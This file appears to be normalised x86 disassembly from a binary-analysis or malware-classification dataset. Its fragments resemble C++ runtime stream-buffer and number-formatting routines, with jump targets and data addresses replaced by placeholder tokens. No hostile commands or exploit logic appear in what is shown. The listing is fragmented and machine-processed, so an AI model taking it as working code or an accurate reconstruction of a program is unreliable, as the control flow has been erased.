mov esi [ ecx ]
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x14 ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x10 ] esi
jge r-xdata
test esi esi
jle r-xdata
pop esi
pop ebx
mov [ ebx ] al
inc ebx
inc [ ebp - 0x4 ]
dec [ ebp + 0x10 ]
push esi
push [ eax ]
push [ ebp + 0xc ]
push ebx
call sub_40102d
mov eax [ edi + 0x30 ]
sub [ eax ] esi
mov eax [ edi + 0x20 ]
add [ ebp - 0x4 ] esi
sub [ ebp + 0x10 ] esi
add esp 0x10
add ebx esi
add [ eax ] esi
jmp r-xdata
mov esi [ ebp + 0x10 ]
mov eax [ edi + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
sub_408c6f
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
push edi
mov edi ecx
jle r-xdata
mov eax [ ebp - 0x4 ]
pop edi
leave
retn 0x8
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor ecx ecx
mov ecx [ edi + 0x34 ]
mov ecx [ ecx ]
jmp r-xdata
movzx eax [ ebx ]
mov edx [ edi ]
push eax
mov ecx edi
call [ edx + 0x4 ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0xc ] ecx
mov esi ecx
jge r-xdata
test ecx ecx
jle r-xdata
pop esi
pop ebx
inc ebx
inc [ ebp - 0x4 ]
dec [ ebp + 0xc ]
push esi
push ebx
push ecx
push [ eax ]
call sub_40102d
mov eax [ edi + 0x34 ]
sub [ eax ] esi
mov eax [ edi + 0x24 ]
add [ ebp - 0x4 ] esi
sub [ ebp + 0xc ] esi
add esp 0x10
add ebx esi
add [ eax ] esi
jmp r-xdata
mov esi [ ebp + 0xc ]
mov eax [ edi + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
sub_408d2b
mov eax [ esi + 0x14 ]
mov ecx [ eax ]
mov [ eax ] eax
mov eax [ esi + 0x14 ]
mov [ eax + 0x4 ] eax
and [ esi + 0x18 ] 0x0
cmp ecx [ esi + 0x14 ]
je r-xdata
retn
push edi
mov edi [ ecx ]
push ecx
call sub_42412e
pop ecx
mov ecx edi
cmp edi [ esi + 0x14 ]
jne r-xdata
pop edi
sub_408d54
mov eax [ esi ]
test eax eax
jne r-xdata
mov eax [ eax ]
jmp r-xdata
call sub_423d5c
mov eax [ esi ]
test eax eax
je r-xdata
mov ecx [ esi + 0x4 ]
cmp ecx [ eax + 0x14 ]
jne r-xdata
xor eax eax
mov eax [ esi + 0x4 ]
mov eax [ eax ]
mov [ esi + 0x4 ] eax
mov eax esi
retn
call sub_423d5c
sub_408d83
push 0x8
mov eax sub_43eabf
call sub_425dad
mov esi [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x4c ] r--data
and [ ebp - 0x4 ] 0x0
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov edi [ eax + 0x4 ]
lea ebx [ esi + 0x4 ]
push ebx
add edi esi
mov [ ebp - 0x10 ] 0x1
call sub_409c90
push 0x2
pop eax
mov [ ebp - 0x4 ] eax
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
push eax
push ebx
mov [ esi + ecx ] r--data
call sub_4093d2
mov eax esi
call sub_425e4c
retn 0x4
sub_408ded
push 0x4
mov eax sub_43a936
call sub_425dad
mov [ ebp - 0x10 ] ecx
mov eax [ ecx - 0x4c ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x4c ] r--data
and [ ebp - 0x4 ] 0x0
lea esi [ ecx - 0x48 ]
mov ecx esi
call sub_408e42
mov eax [ esi - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x4 ] r--data
call sub_425e4c
retn
sub_408e42
push esi
mov esi ecx
test [ esi + 0x40 ] 0x1
mov [ esi ] r--data
je r-xdata
mov ecx [ esi + 0x10 ]
xor eax eax
mov [ ecx ] eax
mov ecx [ esi + 0x20 ]
mov [ ecx ] eax
mov ecx [ esi + 0x30 ]
mov [ ecx ] eax
mov ecx [ esi + 0x14 ]
mov [ ecx ] eax
mov ecx [ esi + 0x24 ]
mov [ ecx ] eax
mov ecx [ esi + 0x34 ]
mov [ ecx ] eax
and [ esi + 0x40 ] 0xfffffffe
mov [ esi + 0x3c ] eax
mov ecx esi
pop esi
jmp sub_408b8a
mov eax [ esi + 0x10 ]
push [ eax ]
call sub_42412e
pop ecx
sub_408e8b
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
test [ esi + 0x40 ] 0x8
push edi
je r-xdata
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffff
jne r-xdata
mov ecx [ esi + 0x24 ]
mov edi [ ecx ]
test edi edi
je r-xdata
mov ecx [ esi + 0x24 ]
mov edx [ ecx ]
test edx edx
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ esi + 0x3c ]
cmp edi edx
jae r-xdata
test [ esi + 0x40 ] 0x2
je r-xdata
mov eax [ esi + 0x34 ]
mov edi [ eax ]
mov ecx edx
add edi ecx
cmp ecx edi
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov eax [ esi + 0x34 ]
mov eax [ eax ]
add eax edi
mov [ ecx ] edx
mov ecx [ esi + 0x34 ]
sub eax edx
mov [ ecx ] eax
test edx edx
jne r-xdata
or eax 0xffffffff
jmp r-xdata
dec [ eax ]
mov esi [ esi + 0x24 ]
mov eax [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov [ eax ] bl
mov eax ebx
jmp r-xdata
mov eax [ esi + 0x34 ]
mov ecx [ esi + 0x10 ]
mov ebx [ eax ]
sub ebx [ ecx ]
add ebx edx
xor ebx ebx
jmp r-xdata
mov ecx [ esi + 0x10 ]
mov ecx [ ecx ]
xor edi edi
mov [ ebp - 0x8 ] ecx
test eax eax
jbe r-xdata
push 0x20
pop eax
mov eax ebx
shr eax 0x1
mov [ ebp - 0x4 ] ebx
cmp eax 0x20
jae r-xdata
test ebx ebx
jbe r-xdata
mov ecx 0x7fffffff
sub ecx eax
cmp ecx ebx
jae r-xdata
jne r-xdata
push ebx
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push edi
call sub_40102d
add esp 0x10
test ebx ebx
test eax eax
jbe r-xdata
shr eax 0x1
jne r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ esi + 0x14 ]
mov eax edi
sub eax edx
add [ esi + 0x3c ] eax
mov eax [ esi + 0x24 ]
mov eax [ eax ]
mov ebx edi
sub eax edx
sub ebx edx
add [ ecx ] ebx
mov ecx [ esi + 0x24 ]
add eax edi
mov [ ecx ] eax
mov ecx edi
sub ecx eax
add ecx [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
mov [ eax ] ecx
test [ esi + 0x40 ] 0x4
je r-xdata
mov eax [ esi + 0x14 ]
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x3c ] edi
mov [ eax ] edi
mov eax [ esi + 0x24 ]
mov [ eax ] edi
mov eax [ esi + 0x34 ]
mov [ eax ] ecx
mov eax [ esi + 0x10 ]
test [ esi + 0x40 ] 0x4
mov [ eax ] edi
mov eax [ esi + 0x20 ]
jne r-xdata
add eax ebx
push 0x0
push eax
mov [ ebp - 0x4 ] eax
call sub_404745
pop ecx
pop ecx
mov edi eax
mov eax [ esi + 0x24 ]
mov ecx [ eax ]
mov eax [ esi + 0x20 ]
mov eax [ eax ]
sub eax edx
mov edx [ esi + 0x10 ]
add eax edi
mov [ edx ] edi
mov edx [ esi + 0x20 ]
sub ecx eax
mov [ edx ] eax
mov eax [ esi + 0x30 ]
inc ecx
mov [ eax ] ecx
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov eax [ esi + 0x20 ]
and [ eax ] 0x0
mov eax [ esi + 0x30 ]
mov [ eax ] edi
jmp r-xdata
mov [ eax ] edi
mov eax [ esi + 0x30 ]
mov [ eax ] 0x1
jmp r-xdata
mov eax [ esi + 0x34 ]
or [ esi + 0x40 ] 0x1
dec [ eax ]
mov esi [ esi + 0x24 ]
mov eax [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] cl
mov eax ecx
push [ ebp - 0x8 ]
call sub_42412e
pop ecx
test [ esi + 0x40 ] 0x1
je r-xdata
sub_409035
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
or eax 0xffffffff
mov edx [ ecx + 0x10 ]
cmp eax [ edx ]
jbe r-xdata
mov edx [ esp + 0x4 ]
cmp edx 0xffffffff
je r-xdata
mov eax [ ecx + 0x30 ]
inc [ eax ]
mov eax [ ecx + 0x20 ]
dec [ eax ]
cmp edx 0xffffffff
je r-xdata
cmp dl [ eax - 0x1 ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ eax ] dl
mov eax edx
jmp r-xdata
test [ ecx + 0x40 ] 0x2
jne r-xdata
retn 0x4
sub_40907d
mov eax [ ecx + 0x20 ]
push edi
mov edi [ eax ]
test edi edi
jne r-xdata
mov edx [ ecx + 0x30 ]
push ebx
mov ebx [ edx ]
push esi
mov esi edi
add ebx esi
cmp esi ebx
jae r-xdata
or eax 0xffffffff
pop edi
retn
test [ ecx + 0x40 ] 0x4
jne r-xdata
movzx eax [ edi ]
jmp r-xdata
or eax 0xffffffff
mov esi [ ecx + 0x24 ]
mov esi [ esi ]
test esi esi
je r-xdata
pop esi
pop ebx
pop edi
retn
cmp esi edi
ja r-xdata
cmp [ ecx + 0x3c ] esi
jae r-xdata
cmp [ ecx + 0x3c ] edi
jbe r-xdata
mov esi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax esi
mov [ edx ] eax
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ ecx + 0x3c ] esi
sub_4090da
push ebp
mov ebp esp
mov edx [ ecx + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
test [ ebp + 0x14 ] 0x1
push ebx
push esi
push edi
je r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test [ ebp + 0x14 ] 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov edi [ eax ]
test edi edi
je r-xdata
mov [ ecx + 0x3c ] eax
mov esi [ r--data ]
mov edx [ edx ]
test edx edx
je r-xdata
cmp [ ebp + 0x10 ] 0x2
mov edx [ r--data ]
jne r-xdata
cmp [ ebp + 0x10 ] 0x2
mov edi [ r--data ]
jne r-xdata
cmp [ ebp + 0x10 ] 0x1
jne r-xdata
mov ebx [ ecx + 0x3c ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x1
jne r-xdata
mov ebx [ ecx + 0x3c ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
test [ ebp + 0x14 ] 0x2
jne r-xdata
mov eax [ ecx + 0x10 ]
sub ebx [ eax ]
mov esi [ ebp + 0xc ]
add esi ebx
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
mov esi edi
jne r-xdata
mov ebx edx
mov eax [ ecx + 0x10 ]
sub ebx [ eax ]
mov esi [ ebp + 0xc ]
add esi ebx
jmp r-xdata
mov esi [ ebp + 0xc ]
mov esi edx
jmp r-xdata
mov ebx edi
test esi esi
jl r-xdata
test esi esi
jl r-xdata
mov esi [ ebp + 0xc ]
mov esi edx
jmp r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
cmp esi ebx
jg r-xdata
mov esi edi
jmp r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
cmp esi ebx
jg r-xdata
mov eax [ ebp + 0x8 ]
pop edi
xor ecx ecx
mov [ eax ] esi
pop esi
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
pop ebp
retn 0x10
mov edx [ ecx + 0x30 ]
sub eax edi
add eax esi
sub [ edx ] eax
mov edx [ ecx + 0x20 ]
add [ edx ] eax
test [ ebp + 0x14 ] 0x2
je r-xdata
sub eax edx
mov edx [ ecx + 0x34 ]
add eax esi
sub [ edx ] eax
mov ecx [ ecx + 0x24 ]
add [ ecx ] eax
jmp r-xdata
mov edx [ ecx + 0x24 ]
mov ebx [ edx ]
test ebx ebx
je r-xdata
mov eax [ ecx + 0x20 ]
mov edi [ eax ]
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
add eax ebx
mov [ edx ] edi
mov ecx [ ecx + 0x34 ]
sub eax edi
mov [ ecx ] eax
jmp r-xdata
sub_409211
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x14 ]
push esi
lea esi [ edx + eax ]
mov eax [ ecx + 0x24 ]
mov edx [ eax ]
push edi
test edx edx
je r-xdata
mov edi [ r--data ]
cmp esi edi
je r-xdata
cmp [ ecx + 0x3c ] edx
jae r-xdata
mov eax [ ebp + 0x8 ]
xor ecx ecx
pop edi
mov [ eax ] esi
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop esi
pop ebp
retn 0x20
test [ ebp + 0x24 ] 0x1
push ebx
je r-xdata
mov [ ecx + 0x3c ] edx
test [ ebp + 0x24 ] 0x2
je r-xdata
mov edx [ ecx + 0x20 ]
mov edx [ edx ]
test edx edx
je r-xdata
mov esi edi
mov edx [ eax ]
test edx edx
je r-xdata
test esi esi
jl r-xdata
test esi esi
jl r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
cmp esi ebx
jg r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
cmp esi ebx
jg r-xdata
sub eax edx
mov edx [ ecx + 0x30 ]
add eax esi
sub [ edx ] eax
mov edx [ ecx + 0x20 ]
add [ edx ] eax
test [ ebp + 0x24 ] 0x2
je r-xdata
sub eax edx
mov edx [ ecx + 0x34 ]
add eax esi
sub [ edx ] eax
mov ecx [ ecx + 0x24 ]
add [ ecx ] eax
jmp r-xdata
pop ebx
mov edx [ ecx + 0x24 ]
mov ebx [ edx ]
test ebx ebx
je r-xdata
mov eax [ ecx + 0x20 ]
mov edi [ eax ]
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
add eax ebx
mov [ edx ] edi
mov ecx [ ecx + 0x34 ]
sub eax edi
mov [ ecx ] eax
jmp r-xdata
sub_4092db
push esi
lea esi [ ecx - 0x4 ]
lea eax [ esi + 0x4 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + eax - 0x4 ] r--data
push eax
mov [ eax ] r--data
call sub_422c43
test [ esp + 0xc ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_42412e
pop ecx
sub_409384
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
jmp r-xdata
mov eax [ ecx ]
movzx edx dl
push edx
call [ eax + 0x4 ]
retn
mov eax [ ecx + 0x34 ]
dec [ eax ]
mov ecx [ ecx + 0x24 ]
mov eax [ ecx ]
push esi
lea esi [ eax + 0x1 ]
mov [ ecx ] esi
mov [ eax ] dl
movzx eax dl
pop esi
retn
test eax eax
jle r-xdata
sub_4093d2
push 0x0
mov eax sub_43a910
call sub_425dad
mov bl [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push esi
call sub_409d47
xor eax eax
mov [ esi ] r--data
test bl 0x1
jne r-xdata
test bl 0x2
jne r-xdata
push 0x4
pop eax
test bl 0x8
je r-xdata
or eax 0x2
test bl 0x4
je r-xdata
or eax 0x8
and [ esi + 0x3c ] 0x0
mov [ esi + 0x40 ] eax
mov eax esi
call sub_425e4c
retn 0x8
or eax 0x10
sub_409423
push 0x40
mov eax sub_43b3eb
call sub_425e16
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x40 ]
xor edi edi
mov [ ebp - 0x4c ] edi
test dl 0x2
jne r-xdata
test dl 0x4
jne r-xdata
mov ecx [ eax + 0x24 ]
cmp [ ecx ] edi
je r-xdata
push edi
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x30 ] 0xf
call sub_404490
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
mov [ ebp - 0x4 ] 0x2
call sub_403de3
lea ecx [ ebp - 0x48 ]
mov edx [ eax + 0x20 ]
cmp [ edx ] edi
je r-xdata
mov ecx [ ecx ]
mov edx [ eax + 0x3c ]
cmp edx ecx
jb r-xdata
mov ecx [ eax + 0x30 ]
mov ecx [ ecx ]
mov eax [ eax + 0x10 ]
add ecx [ edx ]
mov eax [ eax ]
sub ecx eax
push ecx
push eax
lea esi [ ebp - 0x2c ]
call sub_409c3d
xor esi esi
lea eax [ ebp - 0x2c ]
inc esi
push eax
mov ecx ebx
mov [ ebp - 0x4 ] esi
call sub_403de3
push edi
push esi
lea ecx [ ebp - 0x2c ]
jmp r-xdata
mov eax [ eax + 0x14 ]
mov eax [ eax ]
sub ecx eax
push ecx
push eax
lea esi [ ebp - 0x2c ]
call sub_409c3d
mov eax esi
push eax
mov ecx ebx
mov [ ebp - 0x4 ] edi
call sub_403de3
mov ecx esi
jmp r-xdata
mov ecx edx
call sub_40415f
mov eax ebx
call sub_425e60
retn 0x4
push edi
push 0x1
sub_4094e6
push 0x0
mov eax sub_43e514
call sub_425dad
mov ebx [ ebp + 0x8 ]
mov [ ebx ] edi
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi + 0x28 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
cmp [ eax + 0x8 ] 0x0
jne r-xdata
lea ecx [ eax + 0x4 ]
call sub_4230ae
mov eax [ edi ]
mov eax [ eax + 0x4 ]
cmp [ eax + edi + 0x8 ] 0x0
sete al
mov [ ebx + 0x4 ] al
mov eax ebx
call sub_425e4c
retn 0x4
mov eax [ eax + 0x2c ]
test eax eax
je r-xdata
mov esi eax
call sub_408b2a
sub_409545
push 0x0
mov eax sub_43e514
call sub_425dad
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call j_sub_427730
test al al
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax + 0x28 ]
test eax eax
je r-xdata
mov ecx [ esi ]
call sub_409c61
call sub_425e4c
retn 0x4
lea ecx [ eax + 0x4 ]
call sub_4230b7
sub_40958b
push 0x54
mov eax sub_43b3ae
call sub_425e16
mov edi [ ebp + 0x14 ]
test [ edi + 0x10 ] 0x4000
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x3c ] esi
jne r-xdata
lea esi [ ebp - 0x30 ]
mov eax edi
call sub_406595
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_40a871
pop ecx
mov ecx esi
mov [ ebp - 0x34 ] eax
call sub_4061b7
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] 0xf
call sub_404490
mov ecx [ ebp - 0x34 ]
xor esi esi
inc esi
lea eax [ ebp - 0x60 ]
mov [ ebp - 0x4 ] esi
push eax
cmp [ ebp + 0x1c ] bl
je r-xdata
movzx edx [ ebp + 0x1c ]
mov eax [ ecx ]
push edx
push [ ebp + 0x18 ]
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call [ eax + 0x1c ]
jmp r-xdata
call sub_40a4fe
mov [ ebp - 0x4 ] 0x3
call sub_40a515
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
mov eax esi
call sub_425e60
retn 0x18
mov [ ebp - 0x30 ] ebx
cmp eax [ ebp - 0x18 ]
jbe r-xdata
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0x2c ]
call sub_40400a
push ebx
push esi
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x1
call sub_40415f
mov eax [ edi + 0x18 ]
cmp eax ebx
jle r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
push [ ebp - 0x30 ]
lea esi [ ebp - 0x44 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_40a4c9
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x10
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x30 ] ebx
sub eax [ ebp - 0x18 ]
mov [ ebp - 0x30 ] eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x44 ] ecx
cmp eax ebx
jbe r-xdata
lea eax [ ebp - 0x28 ]
mov eax [ edi + 0x10 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
push [ ebp - 0x30 ]
mov eax [ ebp - 0x44 ]
push [ ebp + 0x18 ]
mov [ ebp + 0x10 ] esi
push esi
mov esi [ ebp - 0x3c ]
push eax
mov [ ebp + 0xc ] eax
mov [ edi + 0x18 ] ebx
call sub_40a4c9
add esp 0x10
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_40415f
mov eax [ ebp - 0x38 ]
mov dl [ eax ]
cmp esi ebx
je r-xdata
mov [ ebp - 0x44 ] 0x1
mov ecx esi
call sub_409384
cmp eax 0xffffffff
jne r-xdata
dec [ ebp - 0x34 ]
inc [ ebp - 0x38 ]
cmp [ ebp - 0x34 ] ebx
ja r-xdata
sub_4096f6
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov edx [ esi + 0x10 ]
push edi
push [ ebp + 0x10 ]
mov ebx r--data
push [ ebp + 0xc ]
lea edi [ esp + 0x18 ]
push [ ebp + 0x1c ]
mov [ esp + 0x18 ] eax
call sub_40a28e
push eax
lea eax [ esp + 0x28 ]
push 0x40
push eax
call sub_4235c7
add esp 0x10
push eax
push [ ebp + 0x18 ]
lea edx [ esp + 0x28 ]
push [ esp + 0x1c ]
mov ecx esi
call sub_40a2f3
mov ecx [ esp + 0x70 ]
mov eax [ esp + 0x20 ]
add esp 0x14
pop edi
pop esi
pop ebx
xor ecx esp
call sub_4234de
mov esp ebp
pop ebp
retn 0x18
sub_40976f
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov edx [ esi + 0x10 ]
push edi
push [ ebp + 0x10 ]
mov ebx r--data
push [ ebp + 0xc ]
lea edi [ esp + 0x18 ]
push [ ebp + 0x1c ]
mov [ esp + 0x18 ] eax
call sub_40a28e
push eax
lea eax [ esp + 0x28 ]
push 0x40
push eax
call sub_4235c7
add esp 0x10
push eax
push [ ebp + 0x18 ]
lea edx [ esp + 0x28 ]
push [ esp + 0x1c ]
mov ecx esi
call sub_40a2f3
mov ecx [ esp + 0x70 ]
mov eax [ esp + 0x20 ]
add esp 0x14
pop edi
pop esi
pop ebx
xor ecx esp
call sub_4234de
mov esp ebp
pop ebp
retn 0x18
sub_4097e8
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov edx [ esi + 0x10 ]
push edi
push [ ebp + 0x10 ]
mov ebx r--data
push [ ebp + 0xc ]
lea edi [ esp + 0x18 ]
push [ ebp + 0x20 ]
mov [ esp + 0x18 ] eax
push [ ebp + 0x1c ]
call sub_40a28e
push eax
lea eax [ esp + 0x2c ]
push 0x40
push eax
call sub_4235c7
add esp 0x14
push eax
push [ ebp + 0x18 ]
lea edx [ esp + 0x28 ]
push [ esp + 0x1c ]
mov ecx esi
call sub_40a2f3
mov ecx [ esp + 0x70 ]
mov eax [ esp + 0x20 ]
add esp 0x14
pop edi
pop esi
pop ebx
xor ecx esp
call sub_4234de
mov esp ebp
pop ebp
retn 0x1c
sub_409864
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov edx [ esi + 0x10 ]
push edi
push [ ebp + 0x10 ]
mov ebx r--data
push [ ebp + 0xc ]
lea edi [ esp + 0x18 ]
push [ ebp + 0x20 ]
mov [ esp + 0x18 ] eax
push [ ebp + 0x1c ]
call sub_40a28e
push eax
lea eax [ esp + 0x2c ]
push 0x40
push eax
call sub_4235c7
add esp 0x14
push eax
push [ ebp + 0x18 ]
lea edx [ esp + 0x28 ]
push [ esp + 0x1c ]
mov ecx esi
call sub_40a2f3
mov ecx [ esp + 0x70 ]
mov eax [ esp + 0x20 ]
add esp 0x14
pop edi
pop esi
pop ebx
xor ecx esp
call sub_4234de
mov esp ebp
pop ebp
retn 0x1c
sub_4098e0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x94
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x90 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov ecx [ edi + 0x14 ]
mov [ esp + 0x1c ] eax
mov eax 0x2000
test ecx ecx
jg r-xdata
mov ebx ecx
push 0x24
pop ecx
cmp ebx ecx
mov [ esp + 0x20 ] ecx
jg r-xdata
test [ edi + 0x10 ] eax
jne r-xdata
mov ecx [ edi + 0x10 ]
fld [ ebp + 0x1c ]
sub ebx [ esp + 0x20 ]
and [ esp + 0x14 ] 0x0
and [ esp + 0x18 ] 0x0
mov edx ecx
and edx 0x3000
cmp edx eax
jne r-xdata
mov [ esp + 0x20 ] ebx
push 0x6
pop ecx
push [ ebp + 0x10 ]
xor al al
push [ ebp + 0xc ]
lea esi [ esp + 0x28 ]
push ecx
push ecx
fstp [ esp ]
push [ esp + 0x30 ]
call sub_409df4
push eax
lea eax [ esp + 0x40 ]
push 0x6c
push eax
call sub_4235c7
add esp 0x18
push eax
push ebx
push [ esp + 0x28 ]
lea edx [ esp + 0x3c ]
push [ esp + 0x28 ]
mov ecx edi
push [ ebp + 0x18 ]
push [ esp + 0x38 ]
call sub_409e50
mov ecx [ esp + 0xbc ]
mov eax [ esp + 0x3c ]
add esp 0x20
pop edi
pop esi
pop ebx
xor ecx esp
call sub_4234de
mov esp ebp
pop ebp
retn 0x1c
fld [ r--data ]
fmul st1
fucomp st1
fnstsw ax
test ah 0x44
jpo r-xdata
fldz
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
mov [ esp + 0x13 ] 0x0
fxch st1
fxch st1
mov [ esp + 0x13 ] 0x1
fchs
jmp r-xdata
cmp [ esp + 0x14 ] edx
jae r-xdata
fstp st1
jmp r-xdata
fld [ r--data ]
push 0xa
fcom st1
mov edx 0x1388
pop esi
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
fdiv st2
add [ esp + 0x14 ] esi
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ esp + 0x13 ] 0x0
fstp st1
je r-xdata
cmp ebx esi
jl r-xdata
fchs
fld [ r--data ]
fcomp st1
fnstsw ax
test ah 0x1
jne r-xdata
cmp [ esp + 0x18 ] edx
jae r-xdata
sub ebx esi
fmul st1
add [ esp + 0x18 ] esi
jmp r-xdata
sub_409a5b
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x94
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x90 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov ecx [ edi + 0x14 ]
mov [ esp + 0x1c ] eax
mov eax 0x2000
test ecx ecx
jg r-xdata
mov ebx ecx
push 0x24
pop ecx
cmp ebx ecx
mov [ esp + 0x20 ] ecx
jg r-xdata
test [ edi + 0x10 ] eax
jne r-xdata
mov ecx [ edi + 0x10 ]
sub ebx [ esp + 0x20 ]
and [ esp + 0x14 ] 0x0
and [ esp + 0x18 ] 0x0
mov edx ecx
and edx 0x3000
cmp edx eax
jne r-xdata
mov [ esp + 0x20 ] ebx
push 0x6
pop ecx
fld [ ebp + 0x1c ]
fldz
fld [ ebp + 0x1c ]
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
mov [ esp + 0x13 ] 0x0
jmp r-xdata
mov [ esp + 0x13 ] 0x1
fchs
fld [ r--data ]
push 0xa
fcom st1
mov edx 0x1388
pop esi
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp [ esp + 0x14 ] edx
jae r-xdata
fstp st1
jmp r-xdata
fdiv st2
add [ esp + 0x14 ] esi
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
